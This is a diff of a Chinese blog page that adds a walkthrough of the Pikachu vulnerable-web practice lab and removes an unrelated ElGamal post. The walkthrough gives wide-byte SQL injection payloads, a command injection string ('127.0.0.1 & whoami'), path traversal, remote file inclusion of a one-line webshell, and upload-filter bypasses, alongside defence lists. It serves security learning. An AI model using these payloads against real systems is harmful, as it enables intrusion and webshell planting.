+<p>​        攻击者可以在输入的字符前面加上%00，这样ASP解释器就会将其当作Unicode编码的字符处理，而%00是Unicode编码中的空字符，也就是一个字符的结尾。攻击者可以利用这个特性，将恶意的SQL语句放在宽字符后面，使得ASP程序解释器将宽字符当作一个完整的字符来处理，从而绕过了输入验证过程。</p>
+<p>【防御】：</p>
+<ol>
+<li>输入验证：对于所有的输入都需要进行严格的验证和过滤，包括特殊字符和宽字符。</li>
+<li>输出过滤：对于所有的输出都需要进行过滤，包括HTML和SQL语句，避免将恶意脚本或SQL注入语句输出到页面或数据库。</li>
+<li>使用预编译语句：使用预编译语句可以将SQL语句与用户输入分离，从而避免SQL注入攻击。</li>
+<li>数据库授权：为数据库用户授予最小权限，避免攻击者通过注入攻击获取过多的数据库权限。</li>
+<li>安全编码：在开发过程中，要注重安全编码，避免在代码中留下安全漏洞。</li>
+</ol>
+<p>【源码】</p>
+<img src="/2023/08/01/Pichaku%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0-%E4%B8%8A/image-20230307141223398.png" alt="image-20230307141223398" style="zoom:67%;">
+
+<p>字符型，escape()函数在特殊字符前加\，%5C()为一个字节，%df(β)为两个字节，繁体汉字“运”为三个字节(%df%5c),所以%df%5c会gbk解码为“运”字，从而吃掉\</p>
+<p>原本输入<br>’ union select 1,2# 就能联合查询<br>但是现在转义之后，输入的内容变为<br>\’ union select 1,2# 单引号不起作用</p>
+<p>方法1：引入%df消除”&quot;,注入：%df’ union select database(),user()# ；注意要在Burp Suite抓包处注入</p>
+<img src="/2023/08/01/Pichaku%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0-%E4%B8%8A/image-20230307144008212.png" alt="image-20230307144008212" style="zoom:50%;">
+
+<img src="/2023/08/01/Pichaku%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0-%E4%B8%8A/image-20230307144020822.png" alt="image-20230307144020822" style="zoom:50%;">
+
+<p>方法2：引入“%82”复活单引号， 注入：%82’ union select database(),user()# ；注意要在Burp Suite抓包处注入</p>
+<img src="/2023/08/01/Pichaku%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0-%E4%B8%8A/image-20230307143759959.png" alt="image-20230307143759959" style="zoom: 50%;">
+
+<img src="/2023/08/01/Pichaku%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0-%E4%B8%8A/image-20230307143814197.png" alt="image-20230307143814197" style="zoom:50%;">
+
+
+
+<h2 id="RCE-远程命令执行-远程代码执行-1"><a href="#RCE-远程命令执行-远程代码执行-1" class="headerlink" title="RCE(远程命令执行/远程代码执行)"></a>RCE(远程命令执行/远程代码执行)</h2><p>​    RCE(remote command/code execute)漏洞是Command Injection（命令注入）漏洞的一种；RCE漏洞，是指攻击者能够在目标系统上执行任意代码，从而导致系统被完全控制的安全漏洞。攻击者通常利用此漏洞进行非法活动，如盗取敏感信息、篡改数据、植入后门等。以下是远程命令执行漏洞的流程、攻击方式和防御措施。</p>
+<p><strong>流程</strong></p>
+<p>远程命令执行漏洞的攻击流程通常如下：</p>
+<ol>
+<li>攻击者通过漏洞扫描或其他手段寻找目标系统上的漏洞。</li>
+<li>攻击者确定目标系统上存在远程命令执行漏洞。</li>
+<li>攻击者通过利用漏洞，向目标系统发送恶意请求，包含攻击者编写的恶意代码。</li>
+<li>目标系统收到请求并执行其中的代码。</li>
+<li>攻击者通过执行的恶意代码控制目标系统。</li>
+</ol>
+<p><strong>攻击方式</strong></p>
+<p>远程命令执行漏洞的攻击方式多种多样，常见的攻击方式包括：</p>
+<ol>
+<li>通过Web应用程序进行攻击：攻击者通过在Web应用程序中注入恶意代码来攻击目标系统。这种攻击方式通常会利用Web应用程序的输入验证漏洞。</li>
+<li>通过网络协议进行攻击：攻击者通过向目标系统发送恶意数据包来触发漏洞。这种攻击方式通常会利用网络协议中的缓冲区溢出漏洞等，例如FTP或者SSH等协议中的漏洞。</li>
+<li>通过文件上传进行攻击：攻击者通过上传恶意文件来攻击目标系统。这种攻击方式通常会利用文件上传功能的漏洞。</li>
+</ol>
+<p><strong>防御</strong></p>
+<p>为了防止远程命令执行漏洞的攻击，可以采取以下防御措施：</p>
+<ol>
+<li>输入验证和过滤：应用程序需要对用户输入的数据进行验证和过滤，从而防止恶意代码的注入。例如，应用程序可以对输入的数据进行格式化或者限制输入的范围。</li>
+<li>使用参数化的命令：应用程序应该使用参数化的命令，而不是拼接字符串来构造系统命令。参数化的命令可以防止命令注入攻击。</li>
+<li>最小化权限：应用程序应该以最小的权限来运行系统命令。如果应用程序没有必要执行某些系统命令，应该禁止应用程序执行这些命令。</li>
+<li>安全编码：应用程序应该使用安全编码实践来防止远程命令执行攻击。例如，应该避免使用 eval() 或者 exec() 等可以执行任意代码的函数。</li>
+<li>漏洞扫描和修复：应用程序需要定期进行漏洞扫描和修复，及时发现和修复潜在的漏洞。</li>
+</ol>
+<p><strong>远程系统命令执行</strong><br>         一般出现这种漏洞，是因为应用系统从设计上需要给用户提供指定的远程命令操作的接口，比如我们常见的路由器、防火墙、入侵检测等设备的web管理界面上， 一般会给用户提供一个ping操作的web界面，用户从web界面输入目标IP，提交后，后台会对该IP地址进行一次ping测试，并返回测试结果。 如果，设计者在完成该功能时，没有做严格的安全控制，则可能会导致攻击者通过该接口提交“意想不到”的命令，从而让后台进行执行，从而控制整个后台服务器  （现在很多的甲方企业都开始实施自动化运维,大量的系统操作会通过”自动化运维平台”进行操作。在这种平台上往往会出现远程系统命令执行的漏洞）</p>
+<p><strong>远程代码执行</strong></p>
+<p>​        同样的道理,因为需求设计,后台有时候也会把用户的输入作为代码的一部分进行执行,也就造成了远程代码执行漏洞。不管是使用了代码执行的函数,还是使用了不安全的反序列化等等。  因此，如果需要给前端用户提供操作类的API接口，一定需要对接口输入的内容进行严格的判断，比如实施严格的白名单策略会是一个比较好的方法。 </p>
+<p>【简单的指令】</p>
+<p>Ipconfig：查看ip等信息</p>
+<p>net user：查看系统用户</p>
+<p>dir：查看当前目录</p>
+<p>find;查找包含指定字符的行</p>
+<p>whoami：查看系统当前有效用户名</p>
+<p>systeminfo：查看系统信息</p>
+<p>echo：输出打印</p>
+<p>【常见命令拼接符】</p>
+<ul>
+<li><p>A|B 不管A命令成功与否，都会去执行b命令。</p>
+</li>
+<li><p>&amp;：A&amp;B 各自执行</p>
+</li>
+<li><p>||：A||B 先执行A，如果为假，再执行B</p>
+</li>
+<li><p>&amp;&amp; ：A&amp;&amp;B 先执行A，如果为真，再执行B</p>
+</li>
+<li><p>；： A;B 先执行A后执行B</p>
+</li>
+</ul>
+<h4 id="exec”ping”"><a href="#exec”ping”" class="headerlink" title="exec”ping”"></a>exec”ping”</h4><p>注入：127.0.0.1 &amp; whoami，这里出现乱码了，可以通过修改编码格式解决。id也可以乱输入</p>
+<img src="/2023/08/01/Pichaku%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0-%E4%B8%8A/image-20230308151448328.png" alt="image-20230308151448328" style="zoom:50%;">
+
+<h4 id="exec”evel”"><a href="#exec”evel”" class="headerlink" title="exec”evel”"></a>exec”evel”</h4><p>eval函数会把字符串当成 PHP 代码来执行</p>
+<img src="/2023/08/01/Pichaku%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0-%E4%B8%8A/image-20230308151853403.png" alt="image-20230308151853403" style="zoom:50%;">
+
+
+
+<h2 id="File-Inclusion-1"><a href="#File-Inclusion-1" class="headerlink" title="File Inclusion"></a>File Inclusion</h2><p><strong>File Inclusion(文件包含漏洞)概述</strong></p>
+<p>​           文件包含，是一个功能。在各种开发语言中都提供了内置的文件包含函数，其可以使开发人员在一个代码文件中直接包含（引入）另外一个代码文件。比如 在PHP中，提供了：include()、include_once() 、require()、require_once()    这些文件包含函数，这些函数在代码设计中被经常使用到。                     </p>
+<p>​        大多数情况下，文件包含函数中包含的代码文件是固定的，因此也不会出现安全问题。 但是，有些时候，文件包含的代码文件被写成了一个变量，且这个变量可以由前端用户传进来，这种情况下，如果没有做足够的安全考虑，则可能会引发文件包含漏洞。攻击着会指定一个“意想不到”的文件让包含函数去执行，从而造成恶意操作。                        根据不同的配置环境，文件包含漏洞分为如下两种情况：                         </p>
+<p><strong>1.本地文件包含漏洞：</strong>仅能够对服务器本地的文件进行包含，由于服务器上的文件并不是攻击者所能够控制的，因此该情况下，攻击着更多的会包含一些 固定的系统配置文件，从而读取系统敏感信息。很多时候本地文件包含漏洞会结合一些特殊的文件上传漏洞，从而形成更大的威力。                         </p>
+<p><strong>2.远程文件包含漏洞：</strong>能够通过url地址对远程的文件进行包含，这意味着攻击者可以传入任意的代码，这种情况没啥好说的，准备挂彩。 因此，在web应用系统的功能设计上尽量不要让前端用户直接传变量给包含函数，如果非要这么做，也一定要做严格的白名单策略进行过滤。                    </p>
+<p><strong>【文件包含漏洞的防御方法】</strong>：</p>
+<ol>
+<li>避免使用动态文件包含函数，如PHP的include()或require()函数，尽量使用静态文件包含函数，如include_once()或require_once()函数。</li>
+<li>对用户输入进行过滤和验证，避免用户输入包含特殊字符或恶意代码。</li>
+<li>设置文件包含路径的白名单，限制只能包含应用程序所需的文件路径。</li>
+<li>对应用程序进行安全性测试，及时修补漏洞并更新软件版本。</li>
+<li>启用安全机制，如防火墙、入侵检测系统（IDS）和反病毒软件，及时监测和拦截攻击行为。</li>
+</ol>
+<p>​    </p>
+<h4 id="File-Inclusion（local）"><a href="#File-Inclusion（local）" class="headerlink" title="File Inclusion（local）"></a>File Inclusion（local）</h4><p>正常提交，发现url处存在文件变量，即可能存在文件注入漏洞</p>
+<img src="/2023/08/01/Pichaku%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0-%E4%B8%8A/image-20230310102504711.png" alt="image-20230310102504711" style="zoom:67%;">
+
+<p>输入“./”，发现可以利用报错信息了解目录结构</p>
+<img src="/2023/08/01/Pichaku%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0-%E4%B8%8A/image-20230310103057172.png" alt="image-20230310103057172" style="zoom:67%;">
+
+<p>这里输入../../../../../../就跳到了D盘</p>
+<img src="/2023/08/01/Pichaku%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0-%E4%B8%8A/image-20230310103746058.png" alt="image-20230310103746058" style="zoom:67%;">
+
+<p>若攻击者知道配置文件的地址，就可以通过这个方式进行查看了</p>
+<h4 id="File-Inclusion（remote）"><a href="#File-Inclusion（remote）" class="headerlink" title="File Inclusion（remote）"></a>File Inclusion（remote）</h4><p>攻击方法1：注入恶意网站</p>
+<p>将文件名注入<code>https://www.baidu.com/</code></p>
+<img src="/2023/08/01/Pichaku%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0-%E4%B8%8A/image-20230311102750127.png" alt="image-20230311102750127" style="zoom:67%;">
+
+
+
+<p>攻击方法2：访问恶意文件</p>
+<p>准备一句话木马恶意文件</p>
+<img src="/2023/08/01/Pichaku%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0-%E4%B8%8A/image-20230313092333337.png" alt="image-20230313092333337" style="zoom:67%;">
+
+<p>在url处访问恶意文件：<a target="_blank" rel="noopener" href="http://127.0.0.1/pikachu-master/1.txt%EF%BC%88%E6%B3%A8%E6%84%8F%E4%BF%9D%E5%AD%98%E7%9A%84%E6%96%87%E4%BB%B6%E8%B7%AF%E5%BE%84%EF%BC%89">http://127.0.0.1/pikachu-master/1.txt（注意保存的文件路径）</a></p>
+<img src="/2023/08/01/Pichaku%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0-%E4%B8%8A/image-20230311103705807.png" alt="image-20230311103705807" style="zoom:67%;">
+
+<p>访问后就会生产一个php文件</p>
+<img src="/2023/08/01/Pichaku%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0-%E4%B8%8A/image-20230311103804715.png" alt="image-20230311103804715" style="zoom:67%;">
+
+<p>之后再远程访问该恶意php文件，就可能产生攻击。（由于php版本问题，上述一句话木马可能执行失败）</p>
+<h2 id="unsafe-filedownload-1"><a href="#unsafe-filedownload-1" class="headerlink" title="unsafe filedownload"></a>unsafe filedownload</h2><p>文件下载漏洞是指攻击者通过某种方式绕过应用程序的身份验证和授权机制，直接下载应用程序目录中存储的敏感文件，或者通过改变文件名或目录名等方式获取应用程序中不应该公开的文件。这种漏洞常出现在Web应用程序中，可能会导致恶意用户窃取敏感数据，包括用户账号密码、支付信息、个人资料等。</p>
+<p>一些常见的文件下载漏洞类型包括：</p>
+<ol>
+<li>目录遍历漏洞：攻击者可以通过修改URL路径，访问应用程序目录中的敏感文件，例如../../../../etc/passwd。</li>
+<li>未授权访问漏洞：应用程序没有进行身份验证和授权检查，攻击者可以通过直接访问URL路径下载敏感文件。</li>
+<li>文件名截断漏洞：应用程序没有对文件名进行有效的验证，攻击者可以通过截断文件名的方式访问应用程序目录中的其他文件。</li>
+<li>MIME类型绕过漏洞：攻击者可以通过篡改HTTP响应头中的MIME类型，绕过浏览器的安全机制，让浏览器将恶意代码下载到本地执行。</li>
+</ol>
+<p>为了防止文件下载漏洞，开发人员可以采取以下措施：</p>
+<ol>
+<li>对文件名进行有效的验证和过滤，防止攻击者通过截断文件名等方式绕过应用程序的保护机制。</li>
+<li>对下载请求进行身份验证和授权检查，只允许授权用户访问下载链接。</li>
+<li>对应用程序目录进行严格的权限控制，确保只有授权用户才能访问敏感文件。</li>
+<li>对HTTP响应头中的MIME类型进行有效的验证和过滤，确保浏览器不会执行恶意代码。</li>
+<li>及时更新应用程序的安全补丁，修复已知的文件下载漏洞。</li>
+</ol>
+<p>【攻击流程】</p>
+<p>抓包，发现请求url结构</p>
+<img src="/2023/08/01/Pichaku%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0-%E4%B8%8A/image-20230313094508355.png" alt="image-20230313094508355" style="zoom:67%;">
+
+
+
+<p>方法1：修改抓包处的filename，来进行下载。下载File Inclusion（remote）漏洞用到的一句话木马文件1.txt（注意路径）</p>
+<p><img src="/2023/08/01/Pichaku%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0-%E4%B8%8A/image-20230313095326203.png" alt="image-20230313095326203"></p>
+<img src="/2023/08/01/Pichaku%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0-%E4%B8%8A/image-20230313095522548.png" alt="image-20230313095522548" style="zoom:33%;">
+
+<p>方法2：直接修改连接来下载文件</p>
+<img src="/2023/08/01/Pichaku%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0-%E4%B8%8A/image-20230313095804623.png" alt="image-20230313095804623" style="zoom: 50%;">
+
+
+
+<h2 id="Unsafe-Fileupload"><a href="#Unsafe-Fileupload" class="headerlink" title="Unsafe Fileupload"></a>Unsafe Fileupload</h2><p>​        文件上传漏洞是一种常见的Web安全漏洞，攻击者通过上传恶意文件来执行恶意代码或者获取系统权限。常见的攻击手段包括上传含有恶意脚本的文件、绕过文件类型验证、上传含有木马程序的文件等。</p>
+<p>文件上传漏洞测试流程<br>1、上传文件，查看返回结果（路径，提示等）<br>2、尝试上传不同类型的“恶意”文件，比如xx.php文件，分析结果<br>3、查看html源码，看是否通过js在前端做了上传限制，想办法绕过<br>4、尝试使用不同方式进行绕过：黑白名单绕过/MIME类型绕过/目录0x00截断绕过等<br>5、猜测或者结合其他漏洞（比如敏感信息泄露等）得到木马路径，连接测试</p>
+<p>为了防止文件上传漏洞，可以采取以下措施：</p>
+<ol>
+<li>文件上传目录应该限制在web服务器根目录以外，并对上传文件的大小、类型、数量进行限制；</li>
+<li>对上传文件的文件名、文件类型、文件内容进行严格检查，防止上传恶意脚本、木马程序等；</li>
+<li>限制上传文件的访问权限，并禁止直接访问上传目录；</li>
+<li>对上传文件进行病毒扫描，及时发现并清除上传的恶意文件；</li>
+<li>定期清理上传目录中的无用文件</li>
+</ol>
+<p>报错：<code>Deprecated:  Required parameter $save_path follows optional parameter $type in D:\phpstudy_pro\WWW\pikachu-master\inc\uploadfunction.php on line 91</code></p>
+<img src="/2023/08/01/Pichaku%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0-%E4%B8%8A/image-20230313110842735.png" alt="image-20230313110842735" style="zoom:50%;">
+
+<p>解决方法：这个问题是因为在函数参数列表中，必填参数出现在可选参数之后导致的。在PHP 8中，参数声明必须按照从左到右的顺序进行。要解决这个问题，可以将必填参数移到可选参数之前，或者使用关键字参数</p>
+<img src="/2023/08/01/Pichaku%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0-%E4%B8%8A/image-20230313110954072.png" alt="image-20230313110954072" style="zoom:67%;">
+
+
+
+<h4 id="client-check"><a href="#client-check" class="headerlink" title="client check"></a>client check</h4><p>方法1：直接在开发工具修改</p>
+<img src="/2023/08/01/Pichaku%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0-%E4%B8%8A/image-20230313112229619.png" alt="image-20230313112229619" style="zoom:50%;">
+
+<p>删除onchange函数，绕过只允许提交图片的防御</p>
+<img src="/2023/08/01/Pichaku%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0-%E4%B8%8A/image-20230313112330652.png" alt="image-20230313112330652" style="zoom:50%;">
+
+<p>直接上传恶意php文件（一句话木马）</p>
+<img src="/2023/08/01/Pichaku%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0-%E4%B8%8A/image-20230313112408181.png" alt="image-20230313112408181" style="zoom:50%;">
+
+<p>方法2：写好了一php文件，修改其后缀名为png；然后劫持会话，修改请求（前端）</p>
+<img src="/2023/08/01/Pichaku%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0-%E4%B8%8A/image-20230313150417991.png" alt="image-20230313150417991" style="zoom:50%;">
+
+<img src="/2023/08/01/Pichaku%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0-%E4%B8%8A/image-20230313150429838.png" alt="image-20230313150429838" style="zoom:50%;">
+
+<p>如果上传的是一句话木马，那可能通过触发木马程序来获取webshell。</p>
+<h4 id="MIME-type"><a href="#MIME-type" class="headerlink" title="MIME type"></a>MIME type</h4><p>​        MIME (Multipurpose Internet Mail Extensions) 是一种用于在互联网上传输各种格式数据的扩展协议。MIME 协议是为了解决 Internet 上各种电子邮件、文件传输和其他应用程序之间的互操作性而制定的。MIME 协议通过在邮件头中添加 Content-Type 和 Content-Encoding 等字段来描述邮件内容的类型和编码方式，从而使得邮件内容可以包含各种类型的数据，例如文本、图片、音频、视频、压缩文件等。MIME 类型是一种标准化的文本字符串，用于表示文件的媒体类型和子类型。它由两部分组成，中间用斜杠（/）分隔。例如，常见的 MIME 类型包括：</p>
+<ul>
+<li>text/plain：纯文本文件</li>
+<li>text/html：HTML 文件</li>
+<li>application/json：JSON 数据文件</li>
+<li>application/pdf：PDF 文件</li>
+<li>image/jpeg：JPEG 图像文件</li>
+<li>audio/mpeg：MPEG 音频文件</li>
+<li>video/mp4：MP4 视频文件</li>
+</ul>
+<p>MIME 类型通常用于指定 HTTP 响应中的 Content-Type 字段和电子邮件中的 MIME 部分，以便浏览器或邮件客户端可以正确地解析和显示内容。</p>
+<p>攻击方式1：通过http头的修改绕过了MIME type验证，抓包并修改Content-type</p>
+<img src="/2023/08/01/Pichaku%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0-%E4%B8%8A/image-20230313151902898.png" alt="image-20230313151902898" style="zoom:50%;">
+
+<img src="/2023/08/01/Pichaku%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0-%E4%B8%8A/image-20230313151951730.png" alt="image-20230313151951730" style="zoom: 50%;">
+
+<p>方式2：先讲php后缀改为png，再抓包并修改后缀</p>
+<img src="/2023/08/01/Pichaku%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0-%E4%B8%8A/image-20230313152210862.png" alt="image-20230313152210862" style="zoom: 33%;">
+
+<img src="/2023/08/01/Pichaku%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0-%E4%B8%8A/image-20230313152229779.png" alt="image-20230313152229779" style="zoom:50%;">
+
+
+
+<h4 id="getimagesize"><a href="#getimagesize" class="headerlink" title="getimagesize"></a>getimagesize</h4><p>​        getimagesize()：它是php提供的，通过对目标文件的16进制进行读取，通过该文件的前面几个字符串，来判断文件类型。getmagesize()返回结果中有文件大小和文件类型。<br>​        固定的图片文件，十六进制的头部的前面的几个字符串基本上是一样的，比如说png格式的图片，所有png格式的图片前面的十六进制都是一样的。<br>思路：我们就是要通过伪造十六进制的头部字符串来绕过getimagesize()函数，从而达到上传的效果。</p>
+<p>通过copy米命令合成造一个png+php文件，png是正常图片，php可以是一句话木马等恶意程序；</p>
+<img src="/2023/08/01/Pichaku%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0-%E4%B8%8A/image-20230313153252690.png" alt="image-20230313153252690" style="zoom:50%;">
+
+
+
+<p>后面的步骤就同上面的方法。</p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
       
   
   
@@ -1658,92 +2484,6 @@ int main()
   
   
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://cgw-f.github.io/2021/12/03/ELGamal%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95%E5%8F%8A%E5%85%B6%E6%95%B0%E5%AD%97%E7%AD%BE%E5%90%8D/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="北极星上的稻草人">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="北极星上的稻草人">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2021/12/03/ELGamal%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95%E5%8F%8A%E5%85%B6%E6%95%B0%E5%AD%97%E7%AD%BE%E5%90%8D/" class="post-title-link" itemprop="url">ELGamal加密算法及其数字签名</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2021-12-03 15:00:27" itemprop="dateCreated datePublished" datetime="2021-12-03T15:00:27+08:00">2021-12-03</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2022-01-22 19:57:42" itemprop="dateModified" datetime="2022-01-22T19:57:42+08:00">2022-01-22</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/%E5%AF%86%E7%A0%81%E5%AD%A6/" itemprop="url" rel="index"><span itemprop="name">密码学</span></a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h1 id="ELGamal加密算法及其数字签名"><a href="#ELGamal加密算法及其数字签名" class="headerlink" title="ELGamal加密算法及其数字签名"></a>ELGamal加密算法及其数字签名</h1><p><img src="/2021/12/03/ELGamal%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95%E5%8F%8A%E5%85%B6%E6%95%B0%E5%AD%97%E7%AD%BE%E5%90%8D/image-20220122195603473.png" alt="image-20220122195603473"></p>
-<p>​    ！！求逆元方法可以查看本博客密码学分类的《欧几里得扩展算法》！！</p>
-<p><strong>4、例子</strong></p>
-<p><img src="/2021/12/03/ELGamal%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95%E5%8F%8A%E5%85%B6%E6%95%B0%E5%AD%97%E7%AD%BE%E5%90%8D/image-20220122195629410.png" alt="image-20220122195629410"></p>
-<p><strong>5、ELGamal数字签名体制</strong></p>
-<p>​        公钥PK={y,g,p}，私钥SK={x,p}，要签名的消息为M</p>
-<p>​    <strong>a.签名过程</strong></p>
-<p><img src="/2021/12/03/ELGamal%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95%E5%8F%8A%E5%85%B6%E6%95%B0%E5%AD%97%E7%AD%BE%E5%90%8D/image-20220122195715114.png" alt="image-20220122195715114"></p>
-<p>​    说明：由于t和s都映入了随机数r，所以即使对于同一个消息，r不同，签名结果也会发生变化；这种签名方式称为随机化的数字签名。</p>
-<p>​    <strong>b.认证过程</strong></p>
-<p><img src="/2021/12/03/ELGamal%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95%E5%8F%8A%E5%85%B6%E6%95%B0%E5%AD%97%E7%AD%BE%E5%90%8D/image-20220122195726500.png" alt="image-20220122195726500"></p>
-<p><strong>c.签名合理性证明</strong></p>
-<p><img src="/2021/12/03/ELGamal%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95%E5%8F%8A%E5%85%B6%E6%95%B0%E5%AD%97%E7%AD%BE%E5%90%8D/image-20220122195739090.png" alt="image-20220122195739090"></p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
 
   
   <nav class="pagination">
@@ -1813,7 +2553,7 @@ int main()
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">84</span>
+          <span class="site-state-item-count">85</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
